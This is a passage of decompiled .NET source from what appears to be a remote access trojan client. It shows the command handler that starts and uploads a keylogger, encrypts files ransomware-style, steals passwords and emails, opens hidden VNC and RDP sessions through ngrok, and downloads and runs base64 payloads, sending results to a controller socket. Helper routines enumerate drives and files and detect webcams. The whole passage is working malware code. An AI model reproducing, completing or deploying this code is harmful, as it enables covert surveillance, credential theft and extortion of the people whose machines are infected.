						$VB$Local_A2[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
					}
					GC.Collect();
				}
				else if (Operators.CompareString(left, "ENC", false) == 0)
				{
					object instance14 = Helper.objj(A[1]);
					Type type13 = null;
					string memberName13 = "ENC";
					object[] array = new object[2];
					array[0] = Helper.ID();
					object[] array32 = array;
					int num15 = 1;
					string[] $VB$Local_A2 = A;
					string[] array33 = $VB$Local_A2;
					int num4 = 2;
					array32[num15] = array33[num4];
					object[] array7 = array;
					object[] arguments13 = array7;
					string[] argumentNames13 = null;
					Type[] typeArguments13 = null;
					bool[] array2 = new bool[]
					{
						false,
						true
					};
					NewLateBinding.LateCall(instance14, type13, memberName13, arguments13, argumentNames13, typeArguments13, array2, true);
					if (array2[1])
					{
						$VB$Local_A2[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[1]), typeof(string));
					}
					Thread.Sleep(500);
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("RL", Messages.SPL), Helper.ID())));
					GC.Collect();
				}
				else if (Operators.CompareString(left, "DEC", false) == 0)
				{
					object instance15 = Helper.objj(A[1]);
					Type type14 = null;
					string memberName14 = "DEC";
					object[] array = new object[2];
					array[0] = Helper.ID();
					object[] array34 = array;
					int num16 = 1;
					string[] $VB$Local_A2 = A;
					string[] array35 = $VB$Local_A2;
					int num4 = 2;
					array34[num16] = array35[num4];
					object[] array7 = array;
					object[] arguments14 = array7;
					string[] argumentNames14 = null;
					Type[] typeArguments14 = null;
					bool[] array2 = new bool[]
					{
						false,
						true
					};
					NewLateBinding.LateCall(instance15, type14, memberName14, arguments14, argumentNames14, typeArguments14, array2, true);
					if (array2[1])
					{
						$VB$Local_A2[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[1]), typeof(string));
					}
					Thread.Sleep(500);
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("RL", Messages.SPL), Helper.ID())));
					GC.Collect();
				}
				else if (Operators.CompareString(left, "WBCM", false) == 0)
				{
					if (Messages.Cam())
					{
						object instance16 = Helper.objj(A[1]);
						Type type15 = null;
						string memberName15 = "CON";
						object[] array7 = new object[]
						{
							Settings.Host,
							Settings.Port,
							Settings.SPL,
							Settings.KEY,
							Helper.ID()
						};
						object[] arguments15 = array7;
						string[] argumentNames15 = null;
						Type[] typeArguments15 = null;
						bool[] array2 = new bool[]
						{
							true,
							true,
							true,
							true,
							false
						};
						NewLateBinding.LateCall(instance16, type15, memberName15, arguments15, argumentNames15, typeArguments15, array2, true);
						if (array2[0])
						{
							Settings.Host = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
						}
						if (array2[1])
						{
							Settings.Port = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[1]), typeof(string));
						}
						if (array2[2])
						{
							Settings.SPL = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[2]), typeof(string));
						}
						if (array2[3])
						{
							Settings.KEY = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[3]), typeof(string));
						}
					}
				}
				else if (Operators.CompareString(left, "MICL", false) == 0)
				{
					object instance17 = Helper.objj(A[1]);
					Type type16 = null;
					string memberName16 = "CON";
					object[] array7 = new object[]
					{
						Settings.Host,
						Settings.Port,
						Settings.SPL,
						Settings.KEY,
						Helper.ID()
					};
					object[] arguments16 = array7;
					string[] argumentNames16 = null;
					Type[] typeArguments16 = null;
					bool[] array2 = new bool[]
					{
						true,
						true,
						true,
						true,
						false
					};
					NewLateBinding.LateCall(instance17, type16, memberName16, arguments16, argumentNames16, typeArguments16, array2, true);
					if (array2[0])
					{
						Settings.Host = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
					}
					if (array2[1])
					{
						Settings.Port = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[1]), typeof(string));
					}
					if (array2[2])
					{
						Settings.SPL = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[2]), typeof(string));
					}
					if (array2[3])
					{
						Settings.KEY = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[3]), typeof(string));
					}
				}
				else if (Operators.CompareString(left, "JustFun", false) == 0)
				{
					object instance18 = Helper.objj(A[1]);
					Type type17 = null;
					string memberName17 = "CON";
					object[] array7 = new object[]
					{
						Settings.Host,
						Settings.Port,
						Settings.SPL,
						Settings.KEY,
						Helper.ID()
					};
					object[] arguments17 = array7;
					string[] argumentNames17 = null;
					Type[] typeArguments17 = null;
					bool[] array2 = new bool[]
					{
						true,
						true,
						true,
						true,
						false
					};
					NewLateBinding.LateCall(instance18, type17, memberName17, arguments17, argumentNames17, typeArguments17, array2, true);
					if (array2[0])
					{
						Settings.Host = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
					}
					if (array2[1])
					{
						Settings.Port = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[1]), typeof(string));
					}
					if (array2[2])
					{
						Settings.SPL = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[2]), typeof(string));
					}
					if (array2[3])
					{
						Settings.KEY = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[3]), typeof(string));
					}
				}
				else if (Operators.CompareString(left, "Wsound", false) == 0)
				{
					object instance19 = Helper.objj(A[1]);
					Type type18 = null;
					string memberName18 = "CON";
					object[] array7 = new object[]
					{
						Settings.Host,
						Settings.Port,
						Settings.SPL,
						Settings.KEY,
						Helper.ID()
					};
					object[] arguments18 = array7;
					string[] argumentNames18 = null;
					Type[] typeArguments18 = null;
					bool[] array2 = new bool[]
					{
						true,
						true,
						true,
						true,
						false
					};
					NewLateBinding.LateCall(instance19, type18, memberName18, arguments18, argumentNames18, typeArguments18, array2, true);
					if (array2[0])
					{
						Settings.Host = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
					}
					if (array2[1])
					{
						Settings.Port = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[1]), typeof(string));
					}
					if (array2[2])
					{
						Settings.SPL = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[2]), typeof(string));
					}
					if (array2[3])
					{
						Settings.KEY = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[3]), typeof(string));
					}
				}
				else if (Operators.CompareString(left, "BLOCK!", false) == 0)
				{
					ClientSocket.Send("BLOCK!");
				}
				else if (Operators.CompareString(left, "KL", false) == 0)
				{
					if (Messages.KL != 1)
					{
						NewLateBinding.LateCall(Helper.objj(A[1]), null, "logdf", new object[0], null, null, null, true);
						Messages.KL = 1;
						GC.Collect();
						Application.Run();
					}
				}
				else if (Operators.CompareString(left, "KLdel", false) == 0)
				{
					File.Delete(Messages.KLP);
				}
				else if (Operators.CompareString(left, "KLget", false) == 0)
				{
					if (File.Exists(Messages.KLP))
					{
						ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("KLget", Messages.SPL), Helper.ID())));
					}
				}
				else if (Operators.CompareString(left, "KLGET", false) == 0)
				{
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("KLGET", Messages.SPL), Operators.AddObject(Operators.AddObject(Messages.STOBS64(File.ReadAllText(Messages.KLP)), Messages.SPL), Helper.ID()))));
				}
				else if (Operators.CompareString(left, "TCPV", false) == 0)
				{
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("TCPV", Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "TCPG", false) == 0)
				{
					object left4 = Operators.ConcatenateObject("TCPG", Messages.SPL);
					object instance20 = Helper.objj(A[1]);
					Type type19 = null;
					string memberName19 = "GETTCP";
					object[] array = new object[1];
					object[] array36 = array;
					int num17 = 0;
					string[] $VB$Local_A2 = A;
					string[] array37 = $VB$Local_A2;
					int num4 = 2;
					array36[num17] = array37[num4];
					object[] array7 = array;
					object[] arguments19 = array7;
					string[] argumentNames19 = null;
					Type[] typeArguments19 = null;
					bool[] array2 = new bool[]
					{
						true
					};
					object right2 = NewLateBinding.LateGet(instance20, type19, memberName19, arguments19, argumentNames19, typeArguments19, array2);
					if (array2[0])
					{
						$VB$Local_A2[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
					}
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(left4, right2), Messages.SPL), Process.GetCurrentProcess().Id), Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "ACT", false) == 0)
				{
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("ACT", Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "ACTG", false) == 0)
				{
					object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Helper.objj(A[1]), null, "GetActiveWindows", new object[0], null, null, null));
					try
					{
						foreach (object value3 in ((IEnumerable)objectValue2))
						{
							string right3 = Conversions.ToString(value3);
							try
							{
								ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.AddObject(Operators.AddObject("ACTG", Messages.SPL), Helper.ID()), Messages.SPL), right3)));
							}
							catch (Exception ex9)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					GC.Collect();
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("ENBC", Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "killAct", false) == 0)
				{
					object instance21 = Helper.objj(A[1]);
					Type type20 = null;
					string memberName20 = "Kill";
					object[] array = new object[1];
					object[] array38 = array;
					int num18 = 0;
					string[] $VB$Local_A2 = A;
					string[] array39 = $VB$Local_A2;
					int num4 = 2;
					array38[num18] = array39[num4];
					object[] array7 = array;
					object[] arguments20 = array7;
					string[] argumentNames20 = null;
					Type[] typeArguments20 = null;
					bool[] array2 = new bool[]
					{
						true
					};
					NewLateBinding.LateCall(instance21, type20, memberName20, arguments20, argumentNames20, typeArguments20, array2, true);
					if (array2[0])
					{
						$VB$Local_A2[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
					}
					GC.Collect();
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("Ref", Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "FURL", false) == 0)
				{
					MyProject.Computer.Network.DownloadFile(A[1], A[2]);
					Thread.Sleep(500);
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("RL", Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "msgg", false) == 0)
				{
					MessageBox.Show(A[1]);
				}
				else if (Operators.CompareString(left, "UPtoS", false) == 0)
				{
					MyProject.Computer.Network.UploadFile(A[1], Settings.uploader);
					GC.Collect();
					Thread.Sleep(500);
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("RL", Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "FSG", false) == 0)
				{
					object instance22 = Helper.objj(A[1]);
					Type type21 = null;
					string memberName21 = "RUN";
					object[] array = new object[3];
					array[0] = Settings.uploader;
					object[] array40 = array;
					int num19 = 1;
					string[] $VB$Local_A2 = A;
					string[] array41 = $VB$Local_A2;
					int num4 = 2;
					array40[num19] = array41[num4];
					object[] array42 = array;
					int num20 = 2;
					string[] $VB$Local_A = A;
					string[] array43 = $VB$Local_A;
					int num2 = 3;
					array42[num20] = array43[num2];
					object[] array7 = array;
					object[] arguments21 = array7;
					string[] argumentNames21 = null;
					Type[] typeArguments21 = null;
					bool[] array2 = new bool[]
					{
						false,
						true,
						true
					};
					NewLateBinding.LateCall(instance22, type21, memberName21, arguments21, argumentNames21, typeArguments21, array2, true);
					if (array2[1])
					{
						$VB$Local_A2[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[1]), typeof(string));
					}
					if (array2[2])
					{
						$VB$Local_A[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[2]), typeof(string));
					}
					GC.Collect();
				}
				else if (Operators.CompareString(left, "RENC", false) == 0)
				{
					if (Messages.RS != 1)
					{
						Messages.RS = 1;
						object instance23 = Helper.objj(A[1]);
						Type type22 = null;
						string memberName22 = "ENC";
						object[] array = new object[5];
						array[0] = Helper.ID();
						object[] array44 = array;
						int num21 = 1;
						string[] $VB$Local_A2 = A;
						string[] array45 = $VB$Local_A2;
						int num4 = 2;
						array44[num21] = array45[num4];
						object[] array46 = array;
						int num22 = 2;
						string[] $VB$Local_A = A;
						string[] array47 = $VB$Local_A;
						int num2 = 3;
						array46[num22] = array47[num2];
						object[] array48 = array;
						int num23 = 3;
						string[] $VB$Local_A3 = A;
						string[] array49 = $VB$Local_A3;
						int num24 = 4;
						array48[num23] = array49[num24];
						object[] array50 = array;
						int num25 = 4;
						string[] $VB$Local_A4 = A;
						string[] array51 = $VB$Local_A4;
						int num26 = 5;
						array50[num25] = array51[num26];
						object[] array7 = array;
						object[] arguments22 = array7;
						string[] argumentNames22 = null;
						Type[] typeArguments22 = null;
						bool[] array2 = new bool[]
						{
							false,
							true,
							true,
							true,
							true
						};
						NewLateBinding.LateCall(instance23, type22, memberName22, arguments22, argumentNames22, typeArguments22, array2, true);
						if (array2[1])
						{
							$VB$Local_A2[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[1]), typeof(string));
						}
						if (array2[2])
						{
							$VB$Local_A[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[2]), typeof(string));
						}
						if (array2[3])
						{
							$VB$Local_A3[num24] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[3]), typeof(string));
						}
						if (array2[4])
						{
							$VB$Local_A4[num26] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[4]), typeof(string));
						}
						Messages.RS = 2;
						GC.Collect();
					}
				}
				else if (Operators.CompareString(left, "RDEC", false) == 0)
				{
					if (Messages.RS == 2)
					{
						Messages.RS = 1;
						NewLateBinding.LateCall(Helper.objj(A[1]), null, "DEC", new object[]
						{
							Helper.ID()
						}, null, null, null, true);
						Messages.RS = 0;
						GC.Collect();
					}
				}
				else if (Operators.CompareString(left, "HVNC", false) == 0)
				{
					object instance24 = Helper.objj(A[1]);
					Type type23 = null;
					string memberName23 = "Run";
					object[] array = new object[2];
					object[] array52 = array;
					int num27 = 0;
					string[] $VB$Local_A4 = A;
					string[] array53 = $VB$Local_A4;
					int num26 = 2;
					array52[num27] = array53[num26];
					object[] array54 = array;
					int num28 = 1;
					string[] $VB$Local_A3 = A;
					string[] array55 = $VB$Local_A3;
					int num24 = 3;
					array54[num28] = array55[num24];
					object[] array7 = array;
					object[] arguments23 = array7;
					string[] argumentNames23 = null;
					Type[] typeArguments23 = null;
					bool[] array2 = new bool[]
					{
						true,
						true
					};
					NewLateBinding.LateCall(instance24, type23, memberName23, arguments23, argumentNames23, typeArguments23, array2, true);
					if (array2[0])
					{
						$VB$Local_A4[num26] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
					}
					if (array2[1])
					{
						$VB$Local_A3[num24] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[1]), typeof(string));
					}
					GC.Collect();
				}
				else if (Operators.CompareString(left, "ngrok", false) == 0)
				{
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("ngrok", Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "InstallN", false) == 0)
				{
					if (Messages.ngrok != 1)
					{
						Messages.ngrok = 1;
						object instance25 = Helper.objj(A[1]);
						Type type24 = null;
						string memberName24 = "install";
						object[] array = new object[1];
						object[] array56 = array;
						int num29 = 0;
						string[] $VB$Local_A4 = A;
						string[] array57 = $VB$Local_A4;
						int num26 = 2;
						array56[num29] = array57[num26];
						object[] array7 = array;
						object[] arguments24 = array7;
						string[] argumentNames24 = null;
						Type[] typeArguments24 = null;
						bool[] array2 = new bool[]
						{
							true
						};
						NewLateBinding.LateCall(instance25, type24, memberName24, arguments24, argumentNames24, typeArguments24, array2, true);
						if (array2[0])
						{
							$VB$Local_A4[num26] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
						}
						ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("InstallngC", Messages.SPL), Helper.ID())));
						Messages.ngrok = 0;
						GC.Collect();
					}
				}
				else if (Operators.CompareString(left, "vncs", false) == 0)
				{
					if (File.Exists(Interaction.Environ("Temp") + "\\ngrok.exe"))
					{
						NewLateBinding.LateCall(Helper.objj(A[1]), null, "install", new object[0], null, null, null, true);
						GC.Collect();
						ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("%$3", Messages.SPL), Helper.ID())));
					}
					else
					{
						ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("ngrok", Messages.SPL), Helper.ID())));
					}
				}
				else if (Operators.CompareString(left, "hrdp", false) == 0)
				{
					if (File.Exists(Interaction.Environ("Temp") + "\\ngrok.exe"))
					{
						ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("hrdp", Messages.SPL), Helper.ID())));
					}
					else
					{
						ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("ngrok", Messages.SPL), Helper.ID())));
					}
				}
				else if (Operators.CompareString(left, "hrdp+", false) == 0)
				{
					object left5 = Operators.ConcatenateObject("hrdp+", Messages.SPL);
					object instance26 = Helper.objj(A[1]);
					Type type25 = null;
					string memberName25 = "install";
					object[] array = new object[2];
					object[] array58 = array;
					int num30 = 0;
					string[] $VB$Local_A4 = A;
					string[] array59 = $VB$Local_A4;
					int num26 = 2;
					array58[num30] = array59[num26];
					object[] array60 = array;
					int num31 = 1;
					string[] $VB$Local_A3 = A;
					string[] array61 = $VB$Local_A3;
					int num24 = 3;
					array60[num31] = array61[num24];
					object[] array7 = array;
					object[] arguments25 = array7;
					string[] argumentNames25 = null;
					Type[] typeArguments25 = null;
					bool[] array2 = new bool[]
					{
						true,
						true
					};
					object left6 = NewLateBinding.LateGet(instance26, type25, memberName25, arguments25, argumentNames25, typeArguments25, array2);
					if (array2[0])
					{
						$VB$Local_A4[num26] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
					}
					if (array2[1])
					{
						$VB$Local_A3[num24] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[1]), typeof(string));
					}
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(left5, Operators.AddObject(Operators.AddObject(left6, Messages.SPL), Helper.ID()))));
					GC.Collect();
				}
				else if (Operators.CompareString(left, "PassR", false) == 0)
				{
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("PassR", Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "PC#", false) == 0)
				{
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.AddObject(Operators.AddObject("Getpass", Messages.SPL), Helper.ID()), Messages.SPL), NewLateBinding.LateGet(Helper.objj(A[1]), null, "get", new object[0], null, null, null))));
					GC.Collect();
				}
				else if (Operators.CompareString(left, "Pvbnet", false) == 0)
				{
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.AddObject(Operators.AddObject("Getpass", Messages.SPL), Helper.ID()), Messages.SPL), NewLateBinding.LateGet(Helper.objj(A[1]), null, "gett", new object[0], null, null, null))));
					GC.Collect();
				}
				else if (Operators.CompareString(left, "WDPL", false) == 0)
				{
					NewLateBinding.LateCall(Helper.objj(A[1]), null, "gett", new object[0], null, null, null, true);
					GC.Collect();
				}
				else if (Operators.CompareString(left, "Email", false) == 0)
				{
					string text2 = Conversions.ToString(NewLateBinding.LateGet(Helper.objj(A[1]), null, "Emails", new object[0], null, null, null));
					if (Operators.CompareString(text2, "Error!", false) == 0)
					{
						ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.AddObject(Operators.AddObject("Getpass", Messages.SPL), Helper.ID()), Messages.SPL), "Error!")));
						GC.Collect();
					}
					else
					{
						ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.AddObject(Operators.AddObject("Getpass", Messages.SPL), Helper.ID()), Messages.SPL), text2)));
						GC.Collect();
					}
				}
				else if (Operators.CompareString(left, "Xchat", false) == 0)
				{
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("Xchat", Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "LLCHAT", false) == 0)
				{
					object instance27 = Helper.objj(A[1]);
					Type type26 = null;
					string memberName26 = "CON";
					object[] array7 = new object[]
					{
						Settings.Host,
						Settings.Port,
						Settings.SPL,
						Settings.KEY,
						Helper.ID()
					};
					object[] arguments26 = array7;
					string[] argumentNames26 = null;
					Type[] typeArguments26 = null;
					bool[] array2 = new bool[]
					{
						true,
						true,
						true,
						true,
						false
					};
					NewLateBinding.LateCall(instance27, type26, memberName26, arguments26, argumentNames26, typeArguments26, array2, true);
					if (array2[0])
					{
						Settings.Host = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
					}
					if (array2[1])
					{
						Settings.Port = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[1]), typeof(string));
					}
					if (array2[2])
					{
						Settings.SPL = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[2]), typeof(string));
					}
					if (array2[3])
					{
						Settings.KEY = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[3]), typeof(string));
					}
				}
			}
			catch (Exception ex10)
			{
			}
		}

		// Token: 0x06000029 RID: 41
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

		// Token: 0x0600002A RID: 42
		[DllImport("user32.dll")]
		internal static extern bool keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

		// Token: 0x0600002B RID: 43 RVA: 0x00005F44 File Offset: 0x00004144
		public static byte[] compress(Bitmap imgg, int Q)
		{
			byte[] result;
			try
			{
				using (MemoryStream memoryStream = new MemoryStream())
				{
					System.Drawing.Imaging.Encoder quality = System.Drawing.Imaging.Encoder.Quality;
					EncoderParameters encoderParameters = new EncoderParameters(1);
					EncoderParameter encoderParameter = new EncoderParameter(quality, (long)Q);
					encoderParameters.Param[0] = encoderParameter;
					ImageCodecInfo encoderInfo = RemoteDesktop.GetEncoderInfo(ImageFormat.Jpeg);
					imgg.Save(memoryStream, encoderInfo, encoderParameters);
					encoderParameters.Dispose();
					encoderParameter.Dispose();
					imgg.Dispose();
					GC.Collect();
					ImageConverter imageConverter = new ImageConverter();
					result = (byte[])imageConverter.ConvertTo(Image.FromStream(memoryStream), typeof(byte[]));
				}
			}
			catch (Exception ex)
			{
			}
			return result;
		}

		// Token: 0x0600002C RID: 44 RVA: 0x0000600C File Offset: 0x0000420C
		public static string STOBS64(string s)
		{
			string result;
			try
			{
				byte[] bytes = Encoding.UTF8.GetBytes(s);
				result = Convert.ToBase64String(bytes);
			}
			catch (Exception ex)
			{
			}
			return result;
		}

		// Token: 0x0600002D RID: 45
		[DllImport("avicap32.dll")]
		public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);

		// Token: 0x0600002E RID: 46
		[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

		// Token: 0x0600002F RID: 47 RVA: 0x00006050 File Offset: 0x00004250
		public static bool Cam()
		{
			checked
			{
				try
				{
					int num = 0;
					for (;;)
					{
						string text = null;
						short wDriver = (short)num;
						string text2 = Strings.Space(100);
						if (Messages.capGetDriverDescriptionA(wDriver, ref text2, 100, ref text, 100))
						{
							break;
						}
						num++;
						if (num > 4)
						{
							goto Block_3;
						}
					}
					return true;
					Block_3:;
				}
				catch (Exception ex)
				{
				}
				return false;
			}
		}

		// Token: 0x06000030 RID: 48 RVA: 0x000060AC File Offset: 0x000042AC
		public static string getFolders(object location)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(location));
			object obj = "";
			foreach (DirectoryInfo directoryInfo2 in directoryInfo.GetDirectories())
			{
				obj = Operators.AddObject(obj, "[Folder]" + directoryInfo2.Name + "FileManagerSplitFileManagerSplit");
			}
			return Conversions.ToString(obj);
		}

		// Token: 0x06000031 RID: 49 RVA: 0x00006118 File Offset: 0x00004318
		public static string getFiles(object location)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(location));
			object obj = "";
			foreach (FileInfo fileInfo in directoryInfo.GetFiles("*.*"))
			{
				obj = Operators.AddObject(obj, fileInfo.Name + "FileManagerSplit" + fileInfo.Length.ToString() + "FileManagerSplit");
			}
			return Conversions.ToString(obj);
		}

		// Token: 0x06000032 RID: 50 RVA: 0x0000619C File Offset: 0x0000439C
		public static string getDrives()
		{
			string text = "";
			try
			{
				foreach (DriveInfo driveInfo in MyProject.Computer.FileSystem.Drives)
				{
					switch (driveInfo.DriveType)
					{
					case DriveType.Removable:
						text = text + "[USB]" + driveInfo.Name + "FileManagerSplitFileManagerSplit";
						break;
					case DriveType.Fixed:
						text = text + "[Drive]" + driveInfo.Name + "FileManagerSplitFileManagerSplit";
						break;
					case DriveType.Network:
						text = text + "[NET]" + driveInfo.Name + "FileManagerSplitFileManagerSplit";
						break;
					case DriveType.CDRom:
						text = text + "[CD]" + driveInfo.Name + "FileManagerSplitFileManagerSplit";
						break;
					}
				}
			}
			finally
			{
				IEnumerator<DriveInfo> enumerator;
				if (enumerator != null)
				{
					enumerator.Dispose();
				}
			}
			return text;
		}

		// Token: 0x06000033 RID: 51 RVA: 0x00006280 File Offset: 0x00004480
		private static void Download(string Name, string Data)
		{
			try
			{
				object obj = Path.GetTempFileName() + Name;
				File.WriteAllBytes(Conversions.ToString(obj), (byte[])Helper.frombase64(Data));
				Thread.Sleep(500);
				object instance = null;
				Type typeFromHandle = typeof(Process);
				string memberName = "Start";
				object[] array = new object[]
				{
					RuntimeHelpers.GetObjectValue(obj)
				};
				object[] arguments = array;
				string[] argumentNames = null;
				Type[] typeArguments = null;
				bool[] array2 = new bool[]
				{
					true
				};
				NewLateBinding.LateCall(instance, typeFromHandle, memberName, arguments, argumentNames, typeArguments, array2, true);
				if (array2[0])
				{
					obj = RuntimeHelpers.GetObjectValue(array[0]);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0400001B RID: 27
		private static readonly object SPL = RuntimeHelpers.GetObjectValue(ClientSocket.SPL);

		// Token: 0x0400001C RID: 28
		[AccessedThroughProperty("MyProcess")]
		private static Process _MyProcess;

		// Token: 0x0400001D RID: 29
		private static int processid;

		// Token: 0x0400001E RID: 30
		public static int ngrok;

		// Token: 0x0400001F RID: 31
		public static int RS;

		// Token: 0x04000020 RID: 32
		public static int KL;

		// Token: 0x04000021 RID: 33
		public static string KLP = Path.GetTempPath() + "XKlog.txt";

		// Token: 0x04000022 RID: 34
		public static IntPtr Handle;

		// Token: 0x04000023 RID: 35
		public static int Net3;

		// Token: 0x0200000E RID: 14
		// (Invoke) Token: 0x0600004E RID: 78
		private delegate void AppendOutputTextDelegate(string text);
	}
}
